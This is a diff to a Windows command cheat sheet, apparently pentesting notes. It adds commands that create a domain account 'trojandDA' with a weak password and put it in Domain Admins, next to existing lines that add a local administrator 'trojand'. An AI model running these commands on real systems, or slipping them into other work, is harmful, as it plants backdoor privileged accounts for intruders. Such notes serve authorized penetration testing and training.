@@ -29,6 +29,14 @@ net user trojand imashortpassword /add
 net localgroup administrators trojand /add
 ```
 
+### Adding a Domain Admin account
+```batch
+net group "Domain Admins"
+net user trojandDA P@ssw0rd /add /domain
+net group "Domain Admins" trojandDA /add /domain
+net group "Domain Admins"
+```
+
 ### List files using `#!bash tree`
 ```batch
 tree /f
